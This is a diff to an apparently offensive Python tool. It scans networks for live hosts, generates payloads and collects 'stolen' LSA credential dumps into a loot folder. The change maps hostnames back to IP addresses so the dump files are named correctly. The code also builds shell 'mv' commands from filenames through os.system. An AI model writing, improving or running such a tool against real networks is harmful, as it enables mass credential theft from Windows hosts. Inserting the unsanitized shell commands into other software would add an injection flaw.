@@ -565,15 +565,18 @@ def do_ip(inpu, local_ip): # check if the inputted ips are up so we dont scan th
         pass
 
     hostnames = []
+    ips_from_hostnames = []
     for ip in uphosts:
         try:
-            hostnames.append(socket.gethostbyaddr(ip)[0])
+            tmp = socket.gethostbyaddr(ip)[0]
+            hostnames.append(tmp)
+            ips_from_hostnames.append(socket.gethostbyname(tmp))
         except:
             pass
 
     print('[scan complete]')
 
-    return uphosts, hostnames
+    return uphosts, hostnames, ips_from_hostnames
 
 def gen_payload(share_name, payload_name, drive_letter):
     targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -1095,7 +1098,7 @@ if __name__ == '__main__':
                 print("local IP => " + local_ip)
 
         if '-oe' not in sys.argv: # why scan if we not gonna do anything
-            addresses, hostnames = do_ip(address, local_ip) # gets a list of up hosts
+            addresses, hostnames, ips_from_hostnames = do_ip(address, local_ip) # gets a list of up hosts
 
             if len(addresses) > 500: # ensure that they dont waste over 25 gb of storage
                 print("\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? ".format(str(len(addresses)), str((len(addresses)*52)/1024)))
@@ -1159,7 +1162,7 @@ if __name__ == '__main__':
         for file in dmp_files:
             for name in hostnames:
                 if file[:file.find(".")].lower() == name[:name.find(".")].lower():
-                    os.system("mv {}/loot/{}/{} {}/loot/{}/{}.dmp".format(cwd, timestamp, file, cwd, timestamp, (file[:file.find(".")] + "_" + addresses[hostnames.index(name)])))
+                    os.system("mv {}/loot/{}/{} {}/loot/{}/{}.dmp".format(cwd, timestamp, file, cwd, timestamp, (file[:file.find(".")] + "_" + ips_from_hostnames[hostnames.index(name)])))
 
         if options.ap != False:
             print("\n[parsing files]")
